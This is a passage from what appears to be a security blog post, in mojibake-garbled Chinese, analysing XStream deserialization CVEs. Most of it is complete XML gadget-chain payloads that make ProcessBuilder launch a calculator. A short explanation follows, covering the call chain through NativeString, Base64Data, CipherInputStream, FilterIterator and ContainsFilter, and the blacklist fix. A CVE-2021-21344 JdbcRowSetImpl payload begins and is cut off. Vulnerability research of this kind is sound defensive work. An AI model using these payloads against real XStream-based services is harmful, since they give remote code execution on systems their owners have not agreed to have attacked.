&lt;opmode&gt;0&lt;&#x2F;opmode&gt;</span><br><span class="line">                &lt;serviceIterator class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class&#x3D;&quot;java.util.Collections$EmptyIterator&quot;&#x2F;&gt;</span><br><span class="line">                    &lt;next class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command class&#x3D;&quot;java.util.Arrays$ArrayList&quot;&gt;</span><br><span class="line">                        &lt;a class&#x3D;&quot;string-array&quot;&gt;</span><br><span class="line">                          &lt;string&gt;open&lt;&#x2F;string&gt;</span><br><span class="line">                          &lt;string&gt;-a&lt;&#x2F;string&gt;</span><br><span class="line">                          &lt;string&gt;calculator.app&lt;&#x2F;string&gt;</span><br><span class="line">                        &lt;&#x2F;a&gt;</span><br><span class="line">                      &lt;&#x2F;command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;&#x2F;redirectErrorStream&gt;</span><br><span class="line">                    &lt;&#x2F;next&gt;</span><br><span class="line">                  &lt;&#x2F;iter&gt;</span><br><span class="line">                  &lt;filter class&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;&#x2F;class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;&#x2F;name&gt;</span><br><span class="line">                      &lt;parameter-types&#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;&#x2F;name&gt;</span><br><span class="line">                  &lt;&#x2F;filter&gt;</span><br><span class="line">                  &lt;next class&#x3D;&quot;string&quot;&gt;foo&lt;&#x2F;next&gt;</span><br><span class="line">                &lt;&#x2F;serviceIterator&gt;</span><br><span class="line">                &lt;lock&#x2F;&gt;</span><br><span class="line">              &lt;&#x2F;cipher&gt;</span><br><span class="line">              &lt;input class&#x3D;&quot;java.lang.ProcessBuilder$NullInputStream&quot;&#x2F;&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;&#x2F;ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;&#x2F;done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;&#x2F;ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;&#x2F;ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;&#x2F;closed&gt;</span><br><span class="line">            &lt;&#x2F;is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;&#x2F;consumed&gt;</span><br><span class="line">          &lt;&#x2F;dataSource&gt;</span><br><span class="line">          &lt;transferFlavors&#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;&#x2F;dataLen&gt;</span><br><span class="line">      &lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><a id="more"></a><p>ç®€å•è§£é‡Šä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 1. XStream å¤„ç†Mapç±»å‹ å»è°ƒç”¨</span><br><span class="line">jdk.nashorn.internal.objects.NativeString#hashCode</span><br><span class="line"># 2. hashCodeæ‰§è¡Œäº†this.value.toString()ï¼Œå°†å…¶ä¸­valueè®¾ç½®ä¸ºBase64Data</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString</span><br><span class="line"># 3. Base64Data.toStringæ‰§è¡Œäº†this.dataHandler.getDataSource().getInputStream()ï¼ŒæŒ‡å®šå…¶ä¸­å±æ€§dataHandlerä¸ºjavax.activation.DataHandler</span><br><span class="line">javax.activation.DataHandler#getDataSource</span><br><span class="line"># 4. DataHandler.getDataSource()è¿”å›å±æ€§ç±»å‹ä¸ºDataSourceï¼Œè¯¥å±æ€§ ç½®ä¸ºXmlDataSource</span><br><span class="line">com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream</span><br><span class="line"># 5. XmlDataSource æœ‰ä¸ªInputStreamçš„å±æ€§ï¼Œä¸ºgetInputStreamè¿”å›å€¼ï¼Œè®¾ç½®ä¸ºCipherInputStreamã€‚</span><br><span class="line"># å›åˆ°æ­¥éª¤3ï¼Œæ‰§è¡Œå®ŒgetInputStreamä¹‹åï¼Œæ‰§è¡Œäº†readFrom(is)ï¼Œå®é™…è°ƒç”¨is.read</span><br><span class="line">javax.crypto.CipherInputStream#read -&gt; getMoreData</span><br><span class="line"># 6. CipherInputStream.readè°ƒç”¨this.cipher.update()ï¼Œå…¶ä¸­æŒ‡å®šcipherä¸ºNullCipher</span><br><span class="line">javax.crypto.NullCipher#update -&gt; chooseFirstProvider</span><br><span class="line"># 7. NullCipher.updateæ‰§è¡Œäº†çˆ¶ç±»çš„æ–¹æ³•Cipher.chooseFirstProviderï¼Œç»§ç»­æ‰§è¡Œäº†this.serviceIterator.hasNext(),å…¶ä¸­serviceIterator ç½®ä¸ºFilterIterator</span><br><span class="line">javax.imageio.spi.FilterIterator#next</span><br><span class="line"># 8. FilterIterator.nextæ‰§è¡Œäº†filter.filter()ï¼Œå…¶ä¸­filterä¸ºå±æ€§ï¼Œç½®è¯¥å±æ€§ä¸ºContainsFilterå®ä¾‹</span><br><span class="line">javax.imageio.ImageIO.ContainsFilter#filter</span><br><span class="line"># 9. ContainsFilter.filteræ‰§è¡Œäº†method.invoke(elt)ï¼Œå…¶ä¸­methodä¸ºç±»å±æ€§å¯æ§ï¼Œeltä¸ºå‚æ•°ï¼Œä¸ºiterçš„next()å€¼</span><br><span class="line">ProcessBuilder#start</span><br></pre></td></tr></table></figure><h3 id="å®˜ç½‘çš„POC"><a href="#å®˜ç½‘çš„POC" class="headerlink" title="å®˜ç½‘çš„POC"></a>å®˜ç½‘çš„POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªPOCå¤§åŒå°å¼‚ï¼Œæœ€ä¸åŒç‚¹åœ¨FilterIteratorçš„æ„é€ ï¼Œæ¶‰åŠåˆ°filter.filter(elt) ä¸­çš„eltæ˜¯å¦‚ä½•å®ç°å¯æ§çš„</p><h3 id="æ§åˆ¶elt"><a href="#æ§åˆ¶elt" class="headerlink" title="æ§åˆ¶elt"></a>æ§åˆ¶elt</h3><p>è¿™é‡Œæ˜¯FilterIteratorç±»çš„ä»£ç ï¼Œç›®æ ‡æ˜¯æ§åˆ¶filter.filter(elt)ä¸­çš„eltï¼Œæ³¨æ„æ¯”è¾ƒä¸¤ä¸ªPOCåœ¨FilterIteratorè¿™é‡Œçš„åŒºåˆ«</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#javax.imageio.spi.FilterIterator</span><br><span class="line">    <span class="keyword">private</span> Iterator&lt;T&gt; iter;</span><br><span class="line">    <span class="keyword">private</span> ServiceRegistry.Filter filter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T next = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">advance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">            T elt = iter.next();</span><br><span class="line">            <span class="keyword">if</span> (filter.filter(elt)) &#123;</span><br><span class="line">                next = elt;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        next = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> next != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (next == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        &#125;</span><br><span class="line">        T o = next;</span><br><span class="line">        advance();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li><p>å®˜ç½‘çš„java.util.ArrayList$Itrå®ç°<br>ç”¨çš„æ˜¯java.util.ArrayList$Itr<br>å…¶ä¸­éœ€è¦æ³¨æ„ArrayList.thisï¼Œå½“ArrayList add/growï¼Œéƒ½ä¼šæ›´æ–°ArrayList.elementDataï¼Œæ‰€ä»¥iter.next()æˆåŠŸå–åˆ°ProcessBuilderå®ä¾‹ã€‚<br><img src="/images/pasted-138.png" alt="upload successful"></p></li><li><p>Wh1t3p1gå¸ˆå‚…çš„java.util.Collections$EmptyIteratorå®ç°<br>ç”¨çš„æ˜¯java.util.Collections$EmptyIteratorï¼Œè¿™é‡Œæ³¨æ„åµŒå¥—äº†ä¸¤å±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Iterator it = makeFilterIterator(</span><br><span class="line">                makeFilterIterator(Collections.emptyIterator(), obj, <span class="keyword">null</span>),</span><br><span class="line">                <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">                filter</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p> è¿™é‡Œçš„æ§åˆ¶eltçš„æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>step1:åˆ©ç”¨çš„æ˜¯EmptyIterator hasNext() ä¸ºfalseï¼Œæ„é€ äº†ç¬¬ä¸€å±‚FilterIterator iter1ï¼Œä½¿å¾—iter1.next() = iter1.next</li><li>step2:å†æ„é€ ä¸€å±‚ FilterIterator iter2ï¼Œiter2.iter=iter1,ä½¿å¾—iter2.next() = iter2.iter1.next() = iter2.iter1.next</li></ul></li></ol><p><img src="/images/pasted-139.png" alt="upload successful"></p><h3 id="é»‘åå•ï¼š"><a href="#é»‘åå•ï¼š" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.imageio.ImageIO$ContainsFilter</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE-2021-21344"></a>CVE-2021-21344</h2><p>author: é’Ÿå¸ˆå‚…</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      